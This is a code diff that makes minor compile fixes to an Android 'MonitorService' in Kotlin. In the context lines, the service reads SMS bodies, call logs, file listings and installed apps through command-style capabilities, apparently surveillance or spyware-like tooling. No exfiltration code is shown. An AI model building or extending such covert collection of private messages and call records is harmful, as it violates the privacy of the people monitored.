@@ -23,6 +23,7 @@ import androidx.annotation.RequiresApi
 import androidx.core.app.NotificationCompat
 import androidx.core.app.ServiceCompat
 import androidx.localbroadcastmanager.content.LocalBroadcastManager
+import com.google.gson.Gson
 import kotlin.concurrent.thread
 
 class MonitorService : Service() {
@@ -364,7 +365,7 @@ class MonitorService : Service() {
             val smsList = mutableListOf<Map<String, String>>()
             cursor?.use {
                 while (it.moveToNext()) {
-                    smsList.add(mapOf(
+                    smsList.add(mapOf<String, String>(
                         "address" to it.getString(it.getColumnIndex("address")) ?: "",
                         "body" to it.getString(it.getColumnIndex("body")) ?: "",
                         "date" to it.getString(it.getColumnIndex("date")) ?: "",
@@ -388,7 +389,7 @@ class MonitorService : Service() {
             val calls = mutableListOf<Map<String, String>>()
             cursor?.use {
                 while (it.moveToNext()) {
-                    calls.add(mapOf(
+                    calls.add(mapOf<String, String>(
                         "number" to it.getString(it.getColumnIndex("number")) ?: "",
                         "name" to it.getString(it.getColumnIndex("name")) ?: "",
                         "date" to it.getString(it.getColumnIndex("date")) ?: "",
@@ -404,8 +405,9 @@ class MonitorService : Service() {
 
     inner class FilesCapability(private val service: MonitorService) : Capability {
         override fun execute(args: String): Any {
+            val gson = Gson()
             val path = try {
-                com.google.gson.Gson().fromJson(args, Map::class.java)["path"] as String? ?: "/sdcard"
+                gson.fromJson(args, Map::class.java)["path"] as String? ?: "/sdcard"
             } catch (_: Exception) {
                 "/sdcard"
             }
@@ -430,11 +432,11 @@ class MonitorService : Service() {
         override fun execute(args: String): Any {
             val pm = service.packageManager
             val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
-            return apps.map { app ->
+            return apps.map { app: android.content.pm.ApplicationInfo ->
                 mapOf(
                     "package" to app.packageName,
                     "name" to pm.getApplicationLabel(app).toString(),
-                    "version" to try { pm.getPackageInfo(app.packageName, 0).versionName } catch (_) { "unknown" }
+                    "version" to try { pm.getPackageInfo(app.packageName, 0).versionName } catch (_: Exception) { "unknown" }
                 )
             }
         }
